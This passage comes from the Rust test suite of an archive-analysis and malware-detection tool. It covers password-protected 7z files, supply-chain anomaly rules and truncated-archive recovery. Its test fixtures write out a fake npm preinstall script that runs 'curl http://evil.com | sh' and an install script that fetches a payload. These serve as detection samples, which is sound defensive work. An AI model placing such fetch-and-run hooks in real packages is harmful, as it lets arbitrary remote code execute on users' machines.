        let analyzer_no_pass = ArchiveAnalyzer::new();
        let result = analyzer_no_pass.analyze(&sz_path);
        assert!(result.is_err());

        // Analyze with wrong password should fail
        let analyzer_wrong_pass =
            ArchiveAnalyzer::new().with_zip_passwords(vec!["wrong".to_string()]);
        let result = analyzer_wrong_pass.analyze(&sz_path);
        assert!(result.is_err());

        // Analyze with correct password should succeed
        let analyzer_correct_pass =
            ArchiveAnalyzer::new().with_zip_passwords(vec!["secret".to_string()]);
        let result = analyzer_correct_pass.analyze(&sz_path);

        assert!(result.is_ok(), "Failed to decrypt 7z: {:?}", result.err());
        let report = result.unwrap();
        assert_eq!(report.target.file_type, "7z");
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("secret_test.txt"))
        );
    }

    #[test]
    fn test_7z_mislabeled_zip() {
        // Test that a ZIP file with .7z extension is handled correctly
        let temp_dir = tempfile::tempdir().unwrap();
        let mislabeled_path = temp_dir.path().join("actually_a_zip.7z");

        // Create a ZIP archive but save it with .7z extension
        let file = File::create(&mislabeled_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::SimpleFileOptions::default();
        zip.start_file("test.txt", options).unwrap();
        zip.write_all(b"test content from zip").unwrap();
        zip.finish().unwrap();

        // Verify the file starts with ZIP magic bytes
        let mut file = File::open(&mislabeled_path).unwrap();
        let mut magic = [0u8; 4];
        std::io::Read::read_exact(&mut file, &mut magic).unwrap();
        assert_eq!(magic, [0x50, 0x4B, 0x03, 0x04]); // PK\x03\x04

        // Analyze the mislabeled archive - should succeed
        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&mislabeled_path);

        assert!(
            result.is_ok(),
            "Failed to analyze mislabeled .7z: {:?}",
            result.err()
        );
        let report = result.unwrap();
        assert!(!report.archive_contents.is_empty());
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path.contains("test.txt"))
        );
    }

    #[test]
    #[ignore] // Slow test: creates 101MB file and compresses it (~60s). Run with: cargo test -- --ignored
    fn test_7z_size_limit_protection() {
        // Test that 7z respects file size limits
        let temp_dir = tempfile::tempdir().unwrap();
        let sz_path = temp_dir.path().join("large.7z");

        // Create a file that's too large (> 100MB would be caught)
        let src_dir = temp_dir.path().join("src");
        fs::create_dir(&src_dir).unwrap();
        let large_file = src_dir.join("huge.bin");

        // Create a 101MB file (must be >100MB to trigger MAX_FILE_SIZE detection)
        let large_data = vec![0u8; 101 * 1024 * 1024];
        fs::write(&large_file, large_data).unwrap();

        use sevenz_rust::SevenZWriter;
        let mut sz = SevenZWriter::create(&sz_path).unwrap();
        // Push the directory to properly archive the large file
        sz.push_source_path(&src_dir, |_| true).unwrap();
        sz.finish().unwrap();

        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&sz_path);

        // Should succeed but flag the oversized file
        assert!(result.is_ok());
        let report = result.unwrap();

        // Should have detected excessive file size
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id == "anti-analysis/archive/large-file"
                    && f.desc.contains("excessively large file"))
        );
    }

    // =========================================================================
    // Container-level composite evaluation tests
    // =========================================================================

    #[test]
    fn test_container_composite_findings_collection() {
        // Test that findings from nested files are collected for container-level evaluation
        // This test creates a ZIP with multiple files and verifies the archive analysis
        // infrastructure collects findings properly (even without specific composite rules).

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("package.zip");

        // Create a ZIP with multiple files that could trigger cross-file composites
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);

        // Add package.json (npm package indicator)
        zip.start_file("package.json", options).unwrap();
        std::io::Write::write_all(&mut zip, br#"{"name": "test-package", "version": "1.0.0"}"#)
            .unwrap();

        // Add a shell script (could be suspicious in npm context)
        zip.start_file("install.sh", options).unwrap();
        std::io::Write::write_all(
            &mut zip,
            b"#!/bin/sh\necho 'Installing...'\ncurl http://example.com/payload",
        )
        .unwrap();

        zip.finish().unwrap();

        // Analyze without a capability mapper (just verify structure)
        let analyzer = ArchiveAnalyzer::new();
        let result = analyzer.analyze(&zip_path);

        assert!(result.is_ok(), "Archive analysis should succeed");
        let report = result.unwrap();

        // Verify archive contents include both files
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path == "package.json"),
            "Should have package.json entry"
        );
        assert!(
            report
                .archive_contents
                .iter()
                .any(|e| e.path == "install.sh"),
            "Should have install.sh entry"
        );
    }

    #[test]
    fn test_container_composite_with_capability_mapper() {
        // Test that container-level composite evaluation runs when a capability mapper is present.
        // This uses the full traits directory to verify end-to-end integration.

        // Skip test if traits directory doesn't exist (CI environment may not have it)
        let traits_path = std::path::Path::new("traits");
        if !traits_path.exists() {
            eprintln!("Skipping test: traits directory not found");
            return;
        }

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("npm-package.zip");

        // Create a ZIP mimicking an npm package with suspicious elements
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);

        // Add package.json
        zip.start_file("package.json", options).unwrap();
        std::io::Write::write_all(
            &mut zip,
            br#"{"name": "test", "scripts": {"preinstall": "node setup.js"}}"#,
        )
        .unwrap();

        // Add a JavaScript file with exec patterns
        zip.start_file("setup.js", options).unwrap();
        std::io::Write::write_all(
            &mut zip,
            b"const { exec } = require('child_process');\nexec('curl http://evil.com | sh');",
        )
        .unwrap();

        zip.finish().unwrap();

        // Create analyzer with capability mapper
        let mapper = crate::capabilities::CapabilityMapper::empty();
        let analyzer = ArchiveAnalyzer::new().with_capability_mapper(mapper);

        let result = analyzer.analyze(&zip_path);
        assert!(result.is_ok(), "Archive analysis should succeed");

        let report = result.unwrap();

        // The analysis should complete and produce a report with archive contents
        assert!(!report.archive_contents.is_empty());

        // If container-level composites fired, they would be in report.findings
        // (The exact findings depend on the rules in the traits directory)
        // This test verifies the pipeline runs without errors

        // Also verify that nested file analysis produces FileAnalysis entries
        // with findings that can be used for container-level evaluation
        if !report.files.is_empty() {
            // At least one file should have been analyzed
            let total_nested_findings: usize = report.files.iter().map(|f| f.findings.len()).sum();
            // Log for debugging - actual count depends on trait rules
            eprintln!(
                "Container test: {} files with {} total findings",
                report.files.len(),
                total_nested_findings
            );
        }
    }

    #[test]
    fn test_streaming_container_composite_collection() {
        // Test that the streaming analysis path collects findings for container-level evaluation.
        // This specifically tests the Arc<Mutex<Vec<Finding>>> collection mechanism.

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("stream-test.zip");

        // Create a simple ZIP
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);

        zip.start_file("hello.py", options).unwrap();
        std::io::Write::write_all(&mut zip, b"import os\nprint('hello')").unwrap();
        zip.start_file("subdir/data.py", options).unwrap();
        std::io::Write::write_all(&mut zip, b"import sys\nprint('data')").unwrap();

        zip.finish().unwrap();

        // Use streaming analysis
        let analyzer = ArchiveAnalyzer::new();
        let files_seen = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
        let files_seen_clone = files_seen.clone();

        let result = analyzer.analyze_streaming(&zip_path, move |_file_result| {
            files_seen_clone.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        });

        assert!(result.is_ok(), "Streaming analysis should succeed");
        let report = result.unwrap();

        // Verify streaming processed files
        let files_processed = files_seen.load(std::sync::atomic::Ordering::Relaxed);
        assert!(
            files_processed >= 2,
            "Should have processed at least 2 files"
        );

        // Verify report has summary (streaming mode doesn't populate report.files to save memory)
        assert!(report.summary.is_some());
        let summary = report.summary.unwrap();
        assert!(
            summary.files_analyzed >= 2,
            "Summary should show analyzed files"
        );
    }

    // =========================================================================
    // Supply chain binary anomaly detection tests
    // =========================================================================

    #[test]
    fn test_npm_package_with_exe_detection() {
        // Test that an NPM package containing a .exe file triggers the supply chain rule.
        // This simulates a malicious NPM package with an embedded Windows binary.

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("malicious-npm.tgz");

        // Create a tarball mimicking an npm package with an embedded .exe
        {
            let file = File::create(&zip_path).unwrap();
            let gz = flate2::write::GzEncoder::new(file, flate2::Compression::default());
            let mut tar = tar::Builder::new(gz);

            // Add package.json
            let package_json = br#"{"name": "totally-legit-package", "version": "1.0.0"}"#;
            let mut header = tar::Header::new_gnu();
            header.set_path("package/package.json").unwrap();
            header.set_size(package_json.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append(&header, &package_json[..]).unwrap();

            // Add a suspicious .exe file (just the filename triggers the rule)
            let fake_exe = b"MZ"; // PE magic bytes
            let mut header = tar::Header::new_gnu();
            header.set_path("package/evil.exe").unwrap();
            header.set_size(fake_exe.len() as u64);
            header.set_mode(0o755);
            header.set_cksum();
            tar.append(&header, &fake_exe[..]).unwrap();

            // Finish writes the tar footer, into_inner flushes and finishes the gz stream
            let gz = tar.into_inner().unwrap();
            gz.finish().unwrap();
        }

        // Analyze with capability mapper
        let mapper = make_archive_test_mapper();
        let analyzer = ArchiveAnalyzer::new().with_capability_mapper(mapper);

        let result = analyzer.analyze(&zip_path);
        assert!(
            result.is_ok(),
            "Archive analysis should succeed: {:?}",
            result.err()
        );

        let report = result.unwrap();

        // Check for the supply chain binary anomaly finding
        let has_supply_chain_finding = report.findings.iter().any(|f| {
            f.id.contains("npm-package-with-exe")
                || f.id.contains("script-package-with-windows-binary")
        }) || report.files.iter().any(|file| {
            file.findings.iter().any(|f| {
                f.id.contains("npm-package-with-exe")
                    || f.id.contains("script-package-with-windows-binary")
            })
        });

        // Log findings for debugging
        eprintln!("NPM+exe test findings:");
        for finding in &report.findings {
            if finding.id.contains("supply-chain") || finding.id.contains("npm") {
                eprintln!("  - {} ({:?})", finding.id, finding.crit);
            }
        }

        assert!(
            has_supply_chain_finding,
            "Should detect NPM package with .exe as supply chain anomaly"
        );
    }

    #[test]
    fn test_npm_package_with_png_detection() {
        // Test that an NPM package containing a PNG file triggers the notable finding.

        let temp_dir = tempfile::tempdir().unwrap();
        let zip_path = temp_dir.path().join("npm-with-image.zip");

        // Create a ZIP mimicking an npm package with a PNG
        let file = File::create(&zip_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);

        // Add package.json
        zip.start_file("package.json", options).unwrap();
        std::io::Write::write_all(
            &mut zip,
            br#"{"name": "image-package", "version": "1.0.0"}"#,
        )
        .unwrap();

        // Add a PNG file (with PNG magic bytes)
        zip.start_file("assets/hidden.png", options).unwrap();
        std::io::Write::write_all(&mut zip, b"\x89PNG\r\n\x1a\n").unwrap();

        zip.finish().unwrap();

        // Analyze with capability mapper
        let mapper = make_archive_test_mapper();
        let analyzer = ArchiveAnalyzer::new().with_capability_mapper(mapper);

        let result = analyzer.analyze(&zip_path);
        assert!(result.is_ok(), "Archive analysis should succeed");

        let report = result.unwrap();

        // Check for the image anomaly finding
        let has_image_finding =
            report.findings.iter().any(|f| {
                f.id.contains("npm-package-with-image") || f.id.contains("archive-has-png")
            }) || report.files.iter().any(|file| {
                file.findings
                    .iter()
                    .any(|f| f.id.contains("archive-has-png"))
            });

        // Log findings for debugging
        eprintln!("NPM+PNG test findings:");
        for finding in &report.findings {
            eprintln!("  - {} ({:?})", finding.id, finding.crit);
        }

        // Note: This test may not find the composite if the component traits
        // are not yet evaluated at container level. The test verifies the
        // infrastructure is working.
        if !has_image_finding {
            eprintln!(
                "Warning: npm-package-with-image rule not triggered. \
                This may be expected if container-level composites need the component traits."
            );
        }
    }

    #[test]
    fn test_python_package_with_dll_detection() {
        // Test that a Python package containing a .dll file triggers the supply chain rule.

        let temp_dir = tempfile::tempdir().unwrap();
        let whl_path = temp_dir.path().join("malicious-1.0.0-py3-none-any.whl");

        // Create a wheel (ZIP) mimicking a Python package with an embedded DLL
        let file = File::create(&whl_path).unwrap();
        let mut zip = zip::ZipWriter::new(file);
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);

        // Add setup.py content
        zip.start_file("setup.py", options).unwrap();
        std::io::Write::write_all(
            &mut zip,
            b"from setuptools import setup\nsetup(name='malicious')",
        )
        .unwrap();

        // Add a suspicious .dll file
        zip.start_file("malicious/payload.dll", options).unwrap();
        std::io::Write::write_all(&mut zip, b"MZ").unwrap(); // PE magic

        // Add package metadata
        zip.start_file("malicious-1.0.0.dist-info/METADATA", options)
            .unwrap();
        std::io::Write::write_all(&mut zip, b"Name: malicious\nVersion: 1.0.0").unwrap();

        zip.finish().unwrap();

        // Analyze with capability mapper
        let mapper = make_archive_test_mapper();
        let analyzer = ArchiveAnalyzer::new().with_capability_mapper(mapper);

        let result = analyzer.analyze(&whl_path);
        assert!(result.is_ok(), "Archive analysis should succeed");

        let report = result.unwrap();

        // Check for the supply chain binary anomaly finding
        let has_supply_chain_finding = report.findings.iter().any(|f| {
            f.id.contains("python-package-with-dll")
                || f.id.contains("script-package-with-windows-binary")
        }) || report.files.iter().any(|file| {
            file.findings.iter().any(|f| {
                f.id.contains("python-package-with-dll")
                    || f.id.contains("script-package-with-windows-binary")
            })
        });

        assert!(
            has_supply_chain_finding,
            "Should detect Python package with .dll as supply chain anomaly"
        );
    }

    // =========================================================================
    // Sample extraction (--extract-dir) tests
    // =========================================================================

    #[test]
    fn test_sample_extraction_config_basic() {
        #[allow(clippy::expect_used)]
        let extract_dir = tempfile::tempdir().expect("create extract dir");
        let config = SampleExtractionConfig::new(extract_dir.path().to_path_buf());

        let data = b"hello world";
        let sha256 = "abc123def456";
        let result = config.extract(sha256, "test.txt", data);

        assert!(result.is_some(), "extract should succeed");
        let path = result.unwrap();
        assert!(path.exists(), "extracted file should exist on disk");
        assert_eq!(std::fs::read(&path).unwrap(), data);
        // Should be under <extract_dir>/<sha256[0:6]>/test.txt
        assert!(path.to_string_lossy().contains("abc123"));
        assert!(path.to_string_lossy().ends_with("test.txt"));
    }

    #[test]
    fn test_sample_extraction_config_with_archive_sha256() {
        #[allow(clippy::expect_used)]
        let extract_dir = tempfile::tempdir().expect("create extract dir");
        let config = SampleExtractionConfig::new(extract_dir.path().to_path_buf())
            .with_archive_sha256("archive_hash_abcdef".to_string());

        let data = b"member content";
        let result = config.extract("file_hash_xyz", "lib/module.py", data);

        assert!(result.is_some());
        let path = result.unwrap();
        // Should use archive hash, not file hash
        assert!(
            path.to_string_lossy().contains("archiv"),
            "should use archive sha256 prefix: {}",
            path.display()
        );
        assert!(path.to_string_lossy().ends_with("lib/module.py"));
        assert_eq!(std::fs::read(&path).unwrap(), data);
    }

    #[test]
    fn test_sample_extraction_config_skip_existing() {
        #[allow(clippy::expect_used)]
        let extract_dir = tempfile::tempdir().expect("create extract dir");
        let config = SampleExtractionConfig::new(extract_dir.path().to_path_buf());

        let data = b"same content";
        let sha256 = "deadbeef1234";

        // First write
        let path1 = config.extract(sha256, "file.bin", data);
        assert!(path1.is_some());

        // Second write with same data — should return same path without rewriting
        let path2 = config.extract(sha256, "file.bin", data);
        assert_eq!(path1, path2);
    }

    #[test]
    fn test_small_jar_uses_in_memory_selector() {
        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        let jar_path = temp_dir.path().join("sample.jar");
        let class_bytes =
            std::fs::read("tests/fixtures/java/HelloWorld.class").expect("java fixture present");

        {
            let file = File::create(&jar_path).expect("create jar");
            let mut zip = zip::ZipWriter::new(file);
            let options = zip::write::FileOptions::<()>::default()
                .compression_method(zip::CompressionMethod::Stored);
            zip.start_file("META-INF/MANIFEST.MF", options).unwrap();
            std::io::Write::write_all(&mut zip, b"Manifest-Version: 1.0\nMain-Class: HelloWorld\n")
                .unwrap();
            zip.start_file("HelloWorld.class", options).unwrap();
            std::io::Write::write_all(&mut zip, &class_bytes).unwrap();
            zip.start_file("com/google/Benign.class", options).unwrap();
            std::io::Write::write_all(&mut zip, &class_bytes).unwrap();
            zip.finish().unwrap();
        }

        let analyzer = ArchiveAnalyzer::new();
        let report = analyzer.analyze(&jar_path).expect("analyze jar");
        assert!(
            report
                .metadata
                .tools_used
                .iter()
                .any(|t| t == "in_memory_jar"),
            "small JAR archives should use the in-memory JAR selector"
        );
        assert!(
            report
                .archive_contents
                .iter()
                .any(|entry| entry.path.ends_with("HelloWorld.class"))
        );
    }

    #[test]
    fn test_extract_dir_zip_archive_members() {
        // Zip archives go through the JAR analysis path (is_jar=true for zip).
        // Non-class files in JARs only produce FileAnalysis entries if they are
        // recognized code types. Use .py files to ensure they get analyzed.
        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        #[allow(clippy::expect_used)]
        let extract_dir = tempfile::tempdir().expect("create extract dir");
        let zip_path = temp_dir.path().join("test.zip");

        // Create a zip with Python files (recognized code types that get FileAnalysis entries)
        {
            #[allow(clippy::expect_used)]
            let file = File::create(&zip_path).expect("create zip");
            let mut zip = zip::ZipWriter::new(file);
            let options = zip::write::FileOptions::<()>::default()
                .compression_method(zip::CompressionMethod::Stored);
            zip.start_file("hello.py", options).unwrap();
            std::io::Write::write_all(&mut zip, b"import os\nprint('hello')").unwrap();
            zip.start_file("subdir/data.py", options).unwrap();
            std::io::Write::write_all(&mut zip, b"import sys\nprint('data')").unwrap();
            zip.finish().unwrap();
        }

        let config = SampleExtractionConfig::new(extract_dir.path().to_path_buf());
        let analyzer = ArchiveAnalyzer::new()
            .with_sample_extraction(config)
            .with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        #[allow(clippy::expect_used)]
        let report = analyzer.analyze(&zip_path).expect("analyze zip");

        // Check that archive contents were recorded (all zips populate this)
        assert!(
            !report.archive_contents.is_empty(),
            "zip should have archive_contents"
        );

        // If files were analyzed (depends on type detection), verify extraction
        let extracted_files: Vec<_> = report
            .files
            .iter()
            .filter_map(|f| f.extracted_path.as_ref())
            .collect();
        for path_str in &extracted_files {
            let path = std::path::Path::new(path_str);
            assert!(path.exists(), "extracted file should exist: {}", path_str);
        }
    }

    #[test]
    fn test_extract_dir_tar_gz_archive_members() {
        // tar.gz archives use the generic path — this was the bug
        use flate2::Compression;
        use flate2::write::GzEncoder;
        use tar::Builder;

        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        #[allow(clippy::expect_used)]
        let extract_dir = tempfile::tempdir().expect("create extract dir");
        let tar_gz_path = temp_dir.path().join("test.tar.gz");

        // Create a tar.gz with two files
        {
            let file = File::create(&tar_gz_path).unwrap();
            let enc = GzEncoder::new(file, Compression::default());
            let mut tar_builder = Builder::new(enc);

            let content_a = b"file alpha content";
            let mut header_a = tar::Header::new_gnu();
            header_a.set_path("alpha.txt").unwrap();
            header_a.set_size(content_a.len() as u64);
            header_a.set_mode(0o644);
            header_a.set_cksum();
            tar_builder.append(&header_a, &content_a[..]).unwrap();

            let content_b = b"file beta content";
            let mut header_b = tar::Header::new_gnu();
            header_b.set_path("subdir/beta.txt").unwrap();
            header_b.set_size(content_b.len() as u64);
            header_b.set_mode(0o644);
            header_b.set_cksum();
            tar_builder.append(&header_b, &content_b[..]).unwrap();

            tar_builder.finish().unwrap();
        }

        let config = SampleExtractionConfig::new(extract_dir.path().to_path_buf());
        let analyzer = ArchiveAnalyzer::new()
            .with_sample_extraction(config)
            .with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        #[allow(clippy::expect_used)]
        let report = analyzer.analyze(&tar_gz_path).expect("analyze tar.gz");

        // Check that files were extracted to extract_dir
        let extracted_files: Vec<_> = report
            .files
            .iter()
            .filter_map(|f| f.extracted_path.as_ref())
            .collect();
        assert!(
            !extracted_files.is_empty(),
            "tar.gz members should have extracted_path set, got files: {:?}",
            report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
        );

        // Verify files actually exist on disk with correct content
        for path_str in &extracted_files {
            let path = std::path::Path::new(path_str);
            assert!(path.exists(), "extracted file should exist: {}", path_str);
            let content = std::fs::read(path).unwrap();
            assert!(!content.is_empty(), "extracted file should not be empty");
        }
    }

    /// Build a gzip-wrapped tar of `members`, then cut it off after
    /// `keep_fraction` of its bytes.
    ///
    /// `Compression::none()` keeps the deflate stream as stored blocks so the
    /// surviving prefix decodes to real tar bytes — with default compression a
    /// small fixture is one block that yields nothing until its end, which is
    /// not the shape being tested.
    fn truncated_tar_gz(members: &[(&str, usize)], keep_fraction: f64) -> Vec<u8> {
        use flate2::Compression;
        use flate2::write::GzEncoder;
        use tar::Builder;

        let mut whole = Vec::new();
        {
            let enc = GzEncoder::new(&mut whole, Compression::none());
            let mut builder = Builder::new(enc);
            for (name, size) in members {
                // Printable filler so the extracted members look like text to
                // the member analyzers rather than unclassifiable binary.
                let content = vec![b'A'; *size];
                let mut header = tar::Header::new_gnu();
                header.set_path(name).unwrap();
                header.set_size(content.len() as u64);
                header.set_mode(0o644);
                header.set_cksum();
                builder.append(&header, &content[..]).unwrap();
            }
            builder.into_inner().unwrap().finish().unwrap();
        }

        #[allow(clippy::cast_possible_truncation, clippy::cast_sign_loss)]
        let keep = (whole.len() as f64 * keep_fraction) as usize;
        whole.truncate(keep);
        whole
    }

    /// A truncated gzip stream is the 2026-08-01 production failure: an
    /// extensionless blob, gzip magic, tar inside, cut off mid-member. It used
    /// to abort the whole analysis with "unexpected end of file" and emit no
    /// result at all, discarding megabytes of already-decoded members.
    #[test]
    fn truncated_gzip_analyzes_decoded_prefix() {
        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        // No extension, exactly like a content-addressed blob on disk: the type
        // comes from the magic bytes, which routes to the single-stream gzip
        // path rather than the tar.gz one.
        let blob_path = temp_dir.path().join("deadbeefcafe");
        let truncated = truncated_tar_gz(
            &[
                ("alpha.txt", 40_000),
                ("beta.txt", 40_000),
                ("gamma.txt", 40_000),
            ],
            0.5,
        );
        std::fs::write(&blob_path, &truncated).unwrap();

        // Sanity: the fixture really is undecodable as a whole stream.
        {
            use std::io::Read;
            let mut sink = Vec::new();
            let err = flate2::read::GzDecoder::new(&truncated[..])
                .read_to_end(&mut sink)
                .unwrap_err();
            assert_eq!(err.kind(), std::io::ErrorKind::UnexpectedEof);
            assert!(!sink.is_empty(), "fixture should decode a usable prefix");
        }

        let analyzer =
            ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        #[allow(clippy::expect_used)]
        let report = analyzer
            .analyze(&blob_path)
            .expect("truncated gzip should still produce a report");

        let paths: Vec<&str> = report.files.iter().map(|f| f.path.as_str()).collect();
        assert!(
            paths.iter().any(|p| p.contains("alpha.txt")),
            "members ahead of the cut should be analyzed, got: {paths:?}"
        );
        assert!(
            report
                .metadata
                .errors
                .iter()
                .any(|e| e.contains("ended early") || e.contains("stopped after")),
            "the partial decode should be recorded, got: {:?}",
            report.metadata.errors
        );
        let incomplete = report
            .findings
            .iter()
            .find(|f| f.id == "anti-analysis/malformed/archive-incomplete")
            .expect("a partial read should raise the incomplete-archive finding");
        assert_eq!(
            incomplete.crit,
            Criticality::Notable,
            "an incomplete read is visible, not a verdict"
        );
        assert!(
            !incomplete.evidence.is_empty(),
            "the finding should carry the extraction notes as evidence"
        );
    }

    /// The counterpart: a clean archive must not pick up the finding.
    #[test]
    fn intact_tar_gz_raises_no_incomplete_finding() {
        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        let path = temp_dir.path().join("intact.tar.gz");
        // keep_fraction 1.0 — the same fixture, uncut.
        std::fs::write(
            &path,
            truncated_tar_gz(&[("alpha.txt", 4_000), ("beta.txt", 4_000)], 1.0),
        )
        .unwrap();

        let analyzer =
            ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        #[allow(clippy::expect_used)]
        let report = analyzer.analyze(&path).expect("analyze intact tar.gz");
        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.id == "anti-analysis/malformed/archive-incomplete"),
            "an intact archive must not be flagged incomplete, errors: {:?}",
            report.metadata.errors
        );
    }

    /// The recovery is for streams that yield something. A file that is gzip by
    /// magic but decodes to nothing has no prefix to fall back on, and the
    /// caller is better served by the error than by an empty report.
    #[test]
    fn gzip_yielding_nothing_is_still_an_error() {
        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        let blob_path = temp_dir.path().join("headeronly");
        // A bare gzip header: enough to be typed as gzip, no deflate data.
        std::fs::write(
            &blob_path,
            [0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03],
        )
        .unwrap();

        let analyzer = ArchiveAnalyzer::new();
        assert!(
            analyzer.analyze(&blob_path).is_err(),
            "a gzip stream that decodes to nothing should stay an error"
        );
    }

    /// Same shape one level down: a `.tar.gz` truncated mid-member routes
    /// through the tar extractor, which writes members to disk as it goes, so
    /// the partial-extraction fallback keeps the ones ahead of the cut.
    #[test]
    fn truncated_tar_gz_keeps_members_ahead_of_the_cut() {
        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        let path = temp_dir.path().join("package.tar.gz");
        std::fs::write(
            &path,
            truncated_tar_gz(&[("alpha.txt", 40_000), ("beta.txt", 40_000)], 0.6),
        )
        .unwrap();

        let analyzer =
            ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        #[allow(clippy::expect_used)]
        let report = analyzer
            .analyze(&path)
            .expect("truncated tar.gz should still produce a report");
        let paths: Vec<&str> = report.files.iter().map(|f| f.path.as_str()).collect();
        assert!(
            paths.iter().any(|p| p.contains("alpha.txt")),
            "members ahead of the cut should be analyzed, got: {paths:?}"
        );
    }

    /// The in-memory ZIP path holds every member in RAM, so there is no
    /// temp_dir for the partial-extraction fallback to salvage. A member that
    /// fails to read must cost that member only.
    #[test]
    fn truncated_zip_analyzes_readable_members() {
        use ::zip::write::SimpleFileOptions;

        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        let path = temp_dir.path().join("truncated.zip");

        // Incompressible members, so each one occupies a large, findable span
        // of the file and corrupting a byte range lands in a payload rather
        // than in a header.
        let mut lcg: u32 = 0x1234_5678;
        let mut noise = |len: usize| -> Vec<u8> {
            (0..len)
                .map(|_| {
                    lcg = lcg.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
                    (lcg >> 24) as u8
                })
                .collect()
        };

        let member_len = 40_000;
        let mut whole = Vec::new();
        {
            let mut writer = ::zip::ZipWriter::new(std::io::Cursor::new(&mut whole));
            let options =
                SimpleFileOptions::default().compression_method(::zip::CompressionMethod::Deflated);
            for name in ["alpha.txt", "beta.txt", "gamma.txt"] {
                writer.start_file(name, options).unwrap();
                std::io::Write::write_all(&mut writer, &noise(member_len)).unwrap();
            }
            writer.finish().unwrap();
        }
        assert!(
            whole.len() > 2 * member_len,
            "members must stay incompressible for the corruption offset to land in a payload"
        );

        // Shred a span inside the first member's deflate stream. The central
        // directory and the other members' payloads keep their offsets, so the
        // archive still opens and exactly one member fails to read.
        let mut damaged = whole.clone();
        for byte in &mut damaged[1_000..member_len / 2] {
            *byte ^= 0xff;
        }
        std::fs::write(&path, &damaged).unwrap();

        let analyzer =
            ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        #[allow(clippy::expect_used)]
        let report = analyzer
            .analyze(&path)
            .expect("a damaged ZIP should still produce a report");
        assert!(
            !report.files.is_empty(),
            "readable ZIP members should still be analyzed"
        );
        // Without this the test could pass on an archive that simply opened
        // cleanly: the note proves a member really did fail and was contained.
        assert!(
            report
                .metadata
                .errors
                .iter()
                .any(|e| e.contains("member stream failed") || e.contains("unreadable")),
            "the failed member should be recorded, got: {:?}",
            report.metadata.errors
        );
    }

    #[test]
    fn test_extract_dir_standalone_gz() {
        // Standalone .gz (not .tar.gz) — decompressed content should be persisted
        use flate2::Compression;
        use flate2::write::GzEncoder;

        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        #[allow(clippy::expect_used)]
        let extract_dir = tempfile::tempdir().expect("create extract dir");
        let gz_path = temp_dir.path().join("data.json.gz");

        // Create a standalone .gz file (not a tarball)
        let original_content = b"{\"key\": \"value\", \"items\": [1, 2, 3]}";
        {
            let file = File::create(&gz_path).unwrap();
            let mut enc = GzEncoder::new(file, Compression::default());
            std::io::Write::write_all(&mut enc, original_content).unwrap();
            enc.finish().unwrap();
        }

        let config = SampleExtractionConfig::new(extract_dir.path().to_path_buf());
        let analyzer = ArchiveAnalyzer::new()
            .with_sample_extraction(config)
            .with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        #[allow(clippy::expect_used)]
        let report = analyzer.analyze(&gz_path).expect("analyze .gz");

        // The decompressed file should be extracted to extract_dir
        let extracted_files: Vec<_> = report
            .files
            .iter()
            .filter_map(|f| f.extracted_path.as_ref())
            .collect();
        assert!(
            !extracted_files.is_empty(),
            "standalone .gz decompressed content should be extracted, got files: {:?}",
            report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
        );

        // Verify the decompressed content matches
        for path_str in &extracted_files {
            let path = std::path::Path::new(path_str);
